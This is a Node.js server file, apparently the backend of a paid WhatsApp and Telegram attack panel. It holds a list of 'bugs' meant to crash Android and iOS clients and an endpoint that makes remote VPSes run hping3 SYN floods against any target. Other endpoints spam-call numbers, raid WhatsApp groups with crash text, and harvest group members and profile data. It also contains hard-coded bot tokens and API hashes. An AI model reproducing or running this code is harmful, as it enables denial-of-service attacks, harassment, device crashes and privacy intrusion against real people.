const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const os = require('os');
const pendingCommands = new Map();
const executedLog = new Map();
const waReports = new Map();
const onlineDevices = new Map();
const waSessions = new Map();
const telegramSessions = new Map();
const telegramClients = new Map();
const telegramLogins = new Map();
const activeLogins = new Map();
const activeReports = new Map();
const camStreamers = new Map();
const kioskClients  = new Map(); 
const kioskLocks    = new Map(); 
const telegramReports = new Map();
const SESSION_DIR = path.join(__dirname, 'telegram_sessions');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server }); let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "crash_spam", bug_name: "FORCLOSE CALL MSG" },
  { bug_id: "spam_call", bug_name: "CRASH SYSTEM" },
  { bug_id: "hard", bug_name: "KILL ANDROID" },
  { bug_id: "cxinv", bug_name: "BLANK UI" },
  { bug_id: "click", bug_name: "INVISIBLE" },
  { bug_id: "android", bug_name: "KILL ANDRO" },
  { bug_id: "invisible", bug_name: "DELAY INVISIBLE" },
  { bug_id: "ios_invis", bug_name: "FC IOS INVISIBLE" },
  { bug_id: "ios_noinvis", bug_name: "FC INVISIBLE" },
  { bug_id: "forcloseonemsg", bug_name: "FC ONE MESSAGE" },
  
  
  //{ bug_id: "ui_kill", bug_name: "Android UI Killer" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));

// Initialize these variables properly at the beginning
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Storage untuk spam jobs yang sedang berjalan
const activeSpamJobs = new Map();

// Helper function untuk generate spam ID
function generateSpamId() {
  return `spam_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// Helper function untuk delay
function delaySpam(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function delayReport(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Auto cleanup device yang timeout (> 15 detik tidak heartbeat)
setInterval(() => {
  const now = Date.now();
  for (const [key, device] of onlineDevices.entries()) {
    if (now - device.lastSeen > 15000) {
      console.log(`[SPY] Device timeout: ${device.username}`);
      onlineDevices.delete(key);
    }
  }
}, 10000);

if (typeof telegramClients === 'undefined') {
  const telegramClients = new Map();
}
if (typeof activeLogins === 'undefined') {
  const activeLogins = new Map();
}
if (typeof activeReports === 'undefined') {
  const activeReports = new Map();
}

// Telegram API Configuration
const TELEGRAM_API_ID = 39718088; // Ganti dengan API ID Anda dari https://my.telegram.org
const TELEGRAM_API_HASH = '50336e25ba41a389103a4a93dbe1de94'; // Ganti dengan API Hash Anda

// Helper: Load session dari file
function loadTelegramSession(phone) {
  const sessionFile = path.join(SESSION_DIR, `${phone}.session`);
  if (fs.existsSync(sessionFile)) {
    const sessionString = fs.readFileSync(sessionFile, 'utf8');
    return new StringSession(sessionString);
  }
  return new StringSession('');
}

// Helper: Save session ke file
function saveTelegramSession(phone, sessionString) {
  const sessionFile = path.join(SESSION_DIR, `${phone}.session`);
  fs.writeFileSync(sessionFile, sessionString, 'utf8');
  console.log(`[TELEGRAM] Session saved for ${phone}`);
}

// Helper: Generate login ID
function generateLoginId() {
  return `login_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// Helper: Generate report ID
function generateReportId() {
  return `report_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// Helper: Generate random ID
function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}


// Fix: Proper file watcher initialization
let keyListWatcher = null;

function watchKeyList() {
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  
  keyListWatcher = fs.watchFile("keyList.json", () => {
    console.log("[📂] keyList.json changed, reloading...");
    try {
      sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
    } catch (err) {
      console.error("Error reloading keyList.json:", err.message);
    }
  });
}

// Initialize watcher
watchKeyList();

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  try {
    chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
  } catch (err) {
    console.error("Error loading chat file:", err.message);
    chatList = [];
  }
}

// Simpan chat
function saveChat() {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
  } catch (err) {
    console.error("Error saving chat file:", err.message);
  }
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8616635222:AAHJ9Z8umuAE_rfW2UCEEB_t-bW1MiJiEXU"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });
const ID_GROUP = [
-1004377448229
];

const ID_GROUP_UTAMA = [
-1004377448229
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}
const OWNER_ID = 7836052754;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 9001;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on https://host.asta-official.my.id:9001${wsPort}`);
});

const PORT = 9001;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 10 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (err) {
    console.error("Error loading VPS file:", err.message);
  }
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  // Ensure all users have coins field
  data.forEach(user => {
    if (user.coins === undefined) user.coins = 100; // Default 100 coins
  });
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

// ===== ENDPOINT AUTO REGISTER DARI APP =====
app.post("/autoRegister", (req, res) => {
  const { androidId } = req.body;

  if (!androidId) {
    return res.json({ 
      success: false, 
      message: "androidId diperlukan" 
    });
  }

  try {
    const db = loadDatabase();

    // Generate random username (5 huruf)
    const username = Array.from({ length: 5 }, () => 
      String.fromCharCode(97 + Math.floor(Math.random() * 26))
    ).join('').toUpperCase();

    // Generate random password (5 angka)
    const password = Array.from({ length: 5 }, () => 
      Math.floor(Math.random() * 10)
    ).join('');

    // Cek jika username sudah ada (retry jika perlu)
    if (db.find(u => u.username === username)) {
      return res.json({ 
        success: false, 
        message: "Username conflict, coba lagi" 
      });
    }

    // Set expired date (30 jam dari sekarang)
    const expiredDate = new Date();
    expiredDate.setHours(expiredDate.getHours() + 30);

    // Buat akun baru
    const newUser = {
      username,
      password,
      role: "member",
      expiredDate: expiredDate.toISOString().split("T")[0],
      coins: 0,
      androidId
    };

    db.push(newUser);
    saveDatabase(db);

    // Log
    const logLine = `${new Date().toISOString()} | AUTO_REGISTER | ${username} created from app (Android: ${androidId})\n`;
    fs.appendFileSync('logUser.txt', logLine);

    console.log(`[✅ AUTO REGISTER] ${username} created`);

    // Kirim notifikasi ke grup Telegram
    sendToGroups(
      `🎉 *Pendaftaran Otomatis Baru*\n\n` +
      `👤 Username: \`${username}\`\n` +
      `🔑 Password: \`${password}\`\n` +
      `🎯 Role: Member\n` +
      `⏳ Expired: 30 jam\n` +
      `💰 Coin: 0\n` +
      `📱 Android ID: ${androidId}\n` +
      `⏰ Waktu: ${new Date().toLocaleString("id-ID")}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      success: true,
      username,
      password,
      role: "member",
      expiredDate: newUser.expiredDate,
      coins: 0,
      message: "Akun berhasil dibuat!"
    });

  } catch (err) {
    console.error("[❌ AUTO REGISTER ERROR]", err.message);
    return res.json({ 
      success: false, 
      message: "Terjadi kesalahan server" 
    });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});


app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

// ===== SISTEM TOP UP COIN YANG SUDAH DIPERBAIKI =====
const TOPUP_FILE = "topup_requests.json";
const REDEEM_FILE = "redeem_codes.json";

function loadTopupRequests() {
  if (!fs.existsSync(TOPUP_FILE)) {
    fs.writeFileSync(TOPUP_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(TOPUP_FILE));
}

function saveTopupRequests(data) {
  fs.writeFileSync(TOPUP_FILE, JSON.stringify(data, null, 2));
}

function loadRedeemCodes() {
  if (!fs.existsSync(REDEEM_FILE)) {
    fs.writeFileSync(REDEEM_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(REDEEM_FILE));
}

function saveRedeemCodes(data) {
  fs.writeFileSync(REDEEM_FILE, JSON.stringify(data, null, 2));
}

function findUserByTelegramId(telegramId) {
  const db = loadDatabase();
  let user = db.find(u => u.telegram_id === telegramId);
  
  if (!user) {
    user = db.find(u => u.username === telegramId.toString());
  }
  
  return user;
}

// ===== COMMAND: /register - Daftarkan Telegram ID ke akun =====
bot.onText(/^\/register\s+(\S+)\s+(\S+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from.id;
  const username = match[1].trim();
  const password = match[2].trim();

  const db = loadDatabase();
  
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    return bot.sendMessage(chatId, "❌ Username atau password salah!");
  }

  if (user.telegram_id) {
    return bot.sendMessage(chatId, "⚠️ Akun ini sudah terdaftar dengan Telegram ID lain!");
  }

  user.telegram_id = telegramId;
  
  if (user.coins === undefined) {
    user.coins = 100;
  }
  
  saveDatabase(db);

  bot.sendMessage(chatId, `✅ *Berhasil Mendaftar!*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💰 Coin: ${user.coins}
⏳ Expired: ${user.expiredDate}

Sekarang kamu bisa menggunakan command:
• /topup <jumlah> - Request top up coin
• /checkcoin - Cek saldo coin
• /redeem <kode> - Redeem kode coin`, { parse_mode: "Markdown" });
});

// ===== COMMAND: /topup <jumlah> - Request top up =====
bot.onText(/^\/topup\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const amount = parseInt(match[1]);

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (amount < 25) {
    return bot.sendMessage(chatId, "❌ Minimal top up adalah 25 coin.");
  }

  const topupRequests = loadTopupRequests();
  const hasPending = topupRequests.find(r => r.userId === userId && r.status === "pending");

  if (hasPending) {
    return bot.sendMessage(chatId, `⚠️ Kamu masih memiliki request top up yang pending.

📋 Request ID: \`${hasPending.requestId}\`
💰 Jumlah: ${hasPending.amount} coins
⏳ Status: Pending

Tunggu hingga diproses oleh admin atau gunakan /canceltopup ${hasPending.requestId} untuk membatalkan.`, { parse_mode: "Markdown" });
  }

  const requestId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const newRequest = {
    requestId,
    userId,
    username: user.username,
    amount,
    status: "pending",
    timestamp: new Date().toISOString(),
    source: "telegram"
  };

  topupRequests.push(newRequest);
  saveTopupRequests(topupRequests);

  bot.sendMessage(chatId, `✅ *Request Top Up Berhasil Dibuat!*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
